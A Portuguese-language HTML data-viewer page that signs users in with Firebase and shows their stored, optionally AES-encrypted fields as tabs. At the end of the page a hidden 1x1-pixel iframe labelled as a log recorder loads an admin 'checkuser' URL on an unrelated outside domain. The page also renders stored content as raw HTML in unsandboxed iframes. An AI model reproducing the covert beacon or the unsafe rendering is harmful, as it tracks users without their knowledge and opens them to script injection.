<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Visualizador de Dados</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            padding: 10px;
            margin: 0;
            height: 100vh;
            overflow: hidden;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            height: 100vh;
            max-width: 100%;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        
        /* CABE√áALHO COMPACTO */
        .header {
            background: #4285F4;
            color: white;
            padding: 8px 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
        }
        
        .header h1 {
            font-size: 18px;
            margin: 0;
        }
        
        .auth-compact {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .auth-info {
            font-size: 12px;
            background: rgba(255, 255, 255, 0.2);
            padding: 4px 8px;
            border-radius: 4px;
        }
        
        .auth-buttons-compact {
            display: flex;
            gap: 5px;
        }
        
        .auth-btn {
            padding: 4px 8px;
            font-size: 11px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            background: white;
            color: #4285F4;
        }
        
        .auth-btn.logout {
            background: #EA4335;
            color: white;
        }
        
        /* √ÅREA DE CONTROLES (MENOR) */
        .controls {
            padding: 10px 15px;
            border-bottom: 1px solid #eee;
            background: #f9f9f9;
            flex-shrink: 0;
        }
        
        .input-row {
            display: flex;
            gap: 10px;
            margin-bottom: 8px;
        }
        
        .input-compact {
            flex: 1;
            padding: 8px 10px;
            font-size: 14px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        
        .btn-compact {
            padding: 8px 15px;
            background: #4285F4;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            white-space: nowrap;
        }
        
        .btn-compact:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        /* √ÅREA DE CONTE√öDO (MAIOR) */
        .content-area {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            padding: 0;
        }
        
        /* ABAS */
        .tabs-container {
            background: #f0f0f0;
            padding: 5px 15px 0 15px;
            border-bottom: 1px solid #ddd;
            flex-shrink: 0;
            overflow-x: auto;
            white-space: nowrap;
        }
        
        .tabs {
            display: inline-flex;
            min-width: 100%;
        }
        
        .tab {
            padding: 8px 15px;
            background: #e0e0e0;
            margin-right: 5px;
            border-radius: 5px 5px 0 0;
            cursor: pointer;
            border: 1px solid #ddd;
            border-bottom: none;
            font-size: 14px;
            min-width: 100px;
            text-align: center;
            transition: all 0.2s;
        }
        
        .tab.active {
            background: white;
            color: #4285F4;
            font-weight: bold;
            border-bottom: 2px solid #4285F4;
        }
        
        .tab:hover:not(.active) {
            background: #d0d0d0;
        }
        
        /* IFRAMES (√ÅREA PRINCIPAL) */
        .iframe-container {
            flex: 1;
            position: relative;
            overflow: hidden;
        }
        
        iframe {
            width: 100%;
            height: 100%;
            border: none;
            display: none;
        }
        
        iframe.active {
            display: block;
        }
        
        /* MENSAGENS E STATUS */
        .messages {
            position: fixed;
            top: 60px;
            right: 20px;
            width: 300px;
            z-index: 1000;
        }
        
        .message {
            padding: 10px 15px;
            margin-bottom: 8px;
            border-radius: 4px;
            font-size: 13px;
            animation: slideIn 0.3s ease-out;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        
        .message.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .message.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .message.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        
        .loading {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(255, 255, 255, 0.9);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            display: none;
            z-index: 100;
        }
        
        /* MODAL DE LOGIN (APENAS QUANDO NECESS√ÅRIO) */
        .login-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 2000;
        }
        
        .login-box {
            background: white;
            padding: 20px;
            border-radius: 8px;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        
        .login-box h3 {
            margin-bottom: 15px;
            color: #333;
        }
        
        .login-input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        
        .login-buttons {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }
        
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        /* RESPONSIVIDADE */
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                gap: 8px;
                align-items: flex-start;
            }
            
            .auth-compact {
                width: 100%;
                justify-content: space-between;
            }
            
            .input-row {
                flex-direction: column;
            }
            
            .tab {
                min-width: 80px;
                padding: 6px 10px;
                font-size: 12px;
            }
        }
        
        @media (max-width: 480px) {
            body {
                padding: 5px;
            }
            
            .header h1 {
                font-size: 16px;
            }
            
            .auth-btn {
                font-size: 10px;
                padding: 3px 6px;
            }
            
            .messages {
                width: 250px;
                right: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- CABE√áALHO COMPACTO -->
        <div class="header">
            <h1>üìÑ Visualizador de Dados</h1>
            <div class="auth-compact">
                <div id="authInfo" class="auth-info" style="display: none;">
                    <span id="userEmailCompact"></span>
                </div>
                <div id="authButtons" class="auth-buttons-compact">
                    <button class="auth-btn" onclick="showLoginModal()">Login</button>
                    <button class="auth-btn logout" onclick="logout()" style="display: none;">Sair</button>
                </div>
            </div>
        </div>
        
        <!-- CONTROLES COMPACTOS -->
        <div class="controls">
            <div class="input-row">
                <input type="text" id="userId" class="input-compact" 
                       placeholder="Seu UID (preenchido automaticamente)" disabled>
                <input type="password" id="encryptionPassword" class="input-compact" 
                       placeholder="Senha (se criptografado)">
            </div>
            <div class="input-row">
                <button id="importButton" class="btn-compact" disabled>
                    üîÑ Carregar Dados
                </button>
            </div>
        </div>
        
        <!-- √ÅREA DE CONTE√öDO (MAIOR) -->
        <div class="content-area">
            <!-- ABAS -->
            <div class="tabs-container">
                <div class="tabs" id="tabs">
                    <!-- Abas ser√£o adicionadas aqui -->
                </div>
            </div>
            
            <!-- IFRAMES -->
            <div class="iframe-container" id="iframesContainer">
                <!-- Iframes ser√£o adicionados aqui -->
            </div>
        </div>
        
        <!-- MENSAGENS FLUTUANTES -->
        <div class="messages" id="messages"></div>
        
        <!-- LOADING -->
        <div class="loading" id="loading">
            <p>Carregando dados...</p>
        </div>
        
        <!-- MODAL DE LOGIN (APENAS QUANDO NECESS√ÅRIO) -->
        <div class="login-modal" id="loginModal">
            <div class="login-box">
                <h3>üîê Autentica√ß√£o</h3>
                <input type="email" id="email" class="login-input" placeholder="Email">
                <input type="password" id="password" class="login-input" placeholder="Senha">
                <div class="login-buttons">
                    <button class="btn-compact" onclick="login()" style="flex: 1;">Entrar</button>
                    <button class="btn-compact" onclick="signup()" style="flex: 1; background: #34A853;">Cadastrar</button>
                    <button class="btn-compact" onclick="loginAnonymously()" style="flex: 1; background: #666;">An√¥nimo</button>
                </div>
                <button class="btn-compact" onclick="hideLoginModal()" 
                        style="width: 100%; margin-top: 10px; background: #999;">
                    Cancelar
                </button>
            </div>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>

    <script>
        // Configura√ß√£o do Firebase
        const firebaseConfig = {
            apiKey: "AIzaSyB9GkSqTIZ0kbVsba_WOdQeVAETrF9qna0",
            authDomain: "wzzm-ce3fc.firebaseapp.com",
            projectId: "wzzm-ce3fc",
            storageBucket: "wzzm-ce3fc.appspot.com",
            messagingSenderId: "249427877153",
            appId: "1:249427877153:web:0e4297294794a5aadeb260",
            measurementId: "G-PLKNZNFCQ8"
        };

        // Inicializar Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const auth = firebase.auth();
        
        let currentUser = null;
        let activeTabName = null;

        // Observador de autentica√ß√£o
        auth.onAuthStateChanged((user) => {
            currentUser = user;
            updateAuthUI();
            
            if (user) {
                console.log('Usu√°rio autenticado:', user.uid);
                // Preencher automaticamente o campo de UID
                document.getElementById('userId').value = user.uid;
                showMessage('‚úÖ Autenticado!', 'success');
                
                // Habilitar bot√£o de carregamento
                document.getElementById('importButton').disabled = false;
                
                // Carregar dados automaticamente ap√≥s login
                setTimeout(() => importFromFirebase(), 500);
                
            } else {
                console.log('Usu√°rio n√£o autenticado');
                document.getElementById('userId').value = '';
                document.getElementById('importButton').disabled = true;
                showMessage('üîê Fa√ßa login para visualizar dados', 'info');
                
                // Limpar abas
                clearTabs();
            }
        });

        // Atualizar interface de autentica√ß√£o compacta
        function updateAuthUI() {
            const authInfo = document.getElementById('authInfo');
            const authButtons = document.getElementById('authButtons');
            const loginBtn = authButtons.querySelector('button[onclick="showLoginModal()"]');
            const logoutBtn = authButtons.querySelector('button[onclick="logout()"]');
            
            if (currentUser) {
                // Usu√°rio logado
                authInfo.style.display = 'block';
                document.getElementById('userEmailCompact').textContent = 
                    currentUser.email ? currentUser.email.substring(0, 20) + (currentUser.email.length > 20 ? '...' : '') : 'An√¥nimo';
                loginBtn.style.display = 'none';
                logoutBtn.style.display = 'block';
                
            } else {
                // Usu√°rio n√£o logado
                authInfo.style.display = 'none';
                loginBtn.style.display = 'block';
                logoutBtn.style.display = 'none';
            }
        }

        // Mostrar mensagem flutuante
        function showMessage(text, type = 'info') {
            const messages = document.getElementById('messages');
            const message = document.createElement('div');
            message.className = `message ${type}`;
            message.textContent = text;
            
            messages.appendChild(message);
            
            // Remover ap√≥s 5 segundos
            setTimeout(() => {
                if (message.parentNode) {
                    message.style.opacity = '0';
                    message.style.transition = 'opacity 0.5s';
                    setTimeout(() => {
                        if (message.parentNode) {
                            message.parentNode.removeChild(message);
                        }
                    }, 500);
                }
            }, 5000);
        }

        // Modal de login
        function showLoginModal() {
            document.getElementById('loginModal').style.display = 'flex';
        }
        
        function hideLoginModal() {
            document.getElementById('loginModal').style.display = 'none';
            // Limpar campos
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
        }

        // Fun√ß√µes de autentica√ß√£o
        async function login() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                showMessage('Por favor, preencha email e senha.', 'error');
                return;
            }
            
            try {
                await auth.signInWithEmailAndPassword(email, password);
                showMessage('‚úÖ Login realizado!', 'success');
                hideLoginModal();
            } catch (error) {
                console.error('Erro no login:', error);
                showMessage(`‚ùå Erro: ${error.message}`, 'error');
            }
        }
        
        async function signup() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                showMessage('Por favor, preencha email e senha.', 'error');
                return;
            }
            
            if (password.length < 6) {
                showMessage('A senha deve ter pelo menos 6 caracteres.', 'error');
                return;
            }
            
            try {
                await auth.createUserWithEmailAndPassword(email, password);
                showMessage('‚úÖ Cadastro realizado!', 'success');
                hideLoginModal();
            } catch (error) {
                console.error('Erro no cadastro:', error);
                showMessage(`‚ùå Erro: ${error.message}`, 'error');
            }
        }
        
        async function loginAnonymously() {
            try {
                await auth.signInAnonymously();
                showMessage('‚úÖ Acesso an√¥nimo ativado', 'success');
                hideLoginModal();
            } catch (error) {
                console.error('Erro no acesso an√¥nimo:', error);
                showMessage(`‚ùå Erro: ${error.message}`, 'error');
            }
        }
        
        async function logout() {
            try {
                await auth.signOut();
                showMessage('‚úÖ Logout realizado.', 'info');
                clearTabs();
            } catch (error) {
                console.error('Erro no logout:', error);
                showMessage(`‚ùå Erro: ${error.message}`, 'error');
            }
        }

        // Carregar dados do Firebase
        async function importFromFirebase() {
            if (!currentUser) {
                showMessage('‚ùå Voc√™ precisa estar autenticado.', 'error');
                return;
            }
            
            const userId = document.getElementById('userId').value.trim();
            const password = document.getElementById('encryptionPassword').value;
            
            if (!userId) {
                showMessage('UID n√£o dispon√≠vel.', 'error');
                return;
            }
            
            // Verificar se est√° tentando acessar seu pr√≥prio documento
            if (userId !== currentUser.uid) {
                showMessage('‚ùå Voc√™ s√≥ pode acessar seu pr√≥prio UID.', 'error');
                document.getElementById('userId').value = currentUser.uid;
                return;
            }

            // Limpar abas anteriores
            clearTabs();
            
            // Mostrar loading
            document.getElementById('loading').style.display = 'block';
            document.getElementById('importButton').disabled = true;

            try {
                // Buscar documento
                const docRef = db.collection('gespai').doc(userId);
                const doc = await docRef.get();

                if (!doc.exists) {
                    showMessage('üìù Voc√™ ainda n√£o tem dados salvos.', 'info');
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('importButton').disabled = false;
                    return;
                }

                const data = doc.data();
                let processedData = {};

                // Processar dados (com ou sem criptografia)
                for (const key in data) {
                    if (key !== '_metadata') {
                        let content = data[key];
                        
                        // Tentar descriptografar se houver senha e conte√∫do parece criptografado
                        if (password && typeof content === 'string' && content.includes('U2FsdGVk')) {
                            try {
                                const bytes = CryptoJS.AES.decrypt(content, password);
                                const decrypted = bytes.toString(CryptoJS.enc.Utf8);
                                if (decrypted) {
                                    content = decrypted;
                                }
                            } catch (e) {
                                console.log('N√£o foi poss√≠vel descriptografar:', key);
                            }
                        }
                        
                        processedData[key] = content;
                    }
                }
                
                // Criar abas com os dados processados
                createTabsFromData(processedData);
                
            } catch (error) {
                console.error('Erro ao buscar dados:', error);
                
                if (error.code === 'permission-denied') {
                    showMessage('‚ùå Permiss√£o negada. Verifique autentica√ß√£o.', 'error');
                } else {
                    showMessage(`‚ùå Erro: ${error.message}`, 'error');
                }
            } finally {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('importButton').disabled = false;
            }
        }

        // Criar abas a partir dos dados
        function createTabsFromData(data) {
            if (!data || Object.keys(data).length === 0) {
                showMessage('Nenhum dado encontrado.', 'info');
                return;
            }

            const tabsContainer = document.getElementById('tabs');
            const iframesContainer = document.getElementById('iframesContainer');
            let firstTab = null;

            // Adicionar cada campo como uma aba
            for (const key in data) {
                if (data.hasOwnProperty(key)) {
                    let content = data[key];
                    
                    // Formatar conte√∫do
                    if (typeof content === 'object') {
                        content = JSON.stringify(content, null, 2);
                        content = `<pre style="padding: 20px; white-space: pre-wrap;">${content}</pre>`;
                    } else if (typeof content === 'string' && !content.trim().startsWith('<')) {
                        content = `<div style="padding: 20px;">${content}</div>`;
                    }
                    
                    // Criar aba
                    const tab = document.createElement('div');
                    tab.className = 'tab';
                    tab.textContent = key;
                    tab.onclick = () => switchTab(key);
                    tabsContainer.appendChild(tab);
                    
                    // Criar iframe
                    const iframe = document.createElement('iframe');
                    iframe.id = `iframe_${key}`;
                    iframe.srcdoc = content;
                    iframe.onload = () => adjustIframeHeight(iframe);
                    iframesContainer.appendChild(iframe);
                    
                    if (!firstTab) {
                        firstTab = key;
                    }
                }
            }
            
            // Ativar primeira aba
            if (firstTab) {
                switchTab(firstTab);
                showMessage(`‚úÖ ${Object.keys(data).length} p√°gina(s) carregada(s)`, 'success');
            }
        }

        // Limpar todas as abas
        function clearTabs() {
            document.getElementById('tabs').innerHTML = '';
            document.getElementById('iframesContainer').innerHTML = '';
            activeTabName = null;
        }

        // Alternar entre abas
        function switchTab(tabName) {
            // Atualizar abas
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            
            document.querySelectorAll('.tab').forEach(tab => {
                if (tab.textContent === tabName) {
                    tab.classList.add('active');
                }
            });
            
            // Atualizar iframes
            document.querySelectorAll('iframe').forEach(iframe => {
                iframe.classList.remove('active');
            });
            
            const activeIframe = document.getElementById(`iframe_${tabName}`);
            if (activeIframe) {
                activeIframe.classList.add('active');
                adjustIframeHeight(activeIframe);
            }
            
            activeTabName = tabName;
        }

        // Ajustar altura do iframe
        function adjustIframeHeight(iframe) {
            try {
                const iframeDocument = iframe.contentDocument || iframe.contentWindow.document;
                const body = iframeDocument.body;
                const html = iframeDocument.documentElement;
                
                if (body && html) {
                    const height = Math.max(
                        body.scrollHeight,
                        body.offsetHeight,
                        html.clientHeight,
                        html.scrollHeight,
                        html.offsetHeight
                    );
                    iframe.style.height = Math.min(height, window.innerHeight * 0.8) + 'px';
                }
            } catch (e) {
                // Ignorar erro de cross-origin
                iframe.style.height = 'calc(100vh - 150px)';
            }
        }

        // Event Listeners
        document.getElementById('importButton').onclick = importFromFirebase;
        
        document.getElementById('userId').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') importFromFirebase();
        });
        
        document.getElementById('encryptionPassword').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') importFromFirebase();
        });

        // Inicializar
        document.addEventListener('DOMContentLoaded', () => {
            updateAuthUI();
            
            // Se j√° estiver autenticado, carregar automaticamente
            if (auth.currentUser) {
                setTimeout(() => importFromFirebase(), 1000);
            }
        });
    </script>

<iframe 
    src="https://wazzimagiygg.com/admin/checkuser/universalcheckuser" 
    style="width: 1px; height: 1px; border: none; position: fixed; bottom: 10px; right: 10px; z-index: 9999;"
    title="Registrador de Logs">
</iframe>
    
</body>
</html>
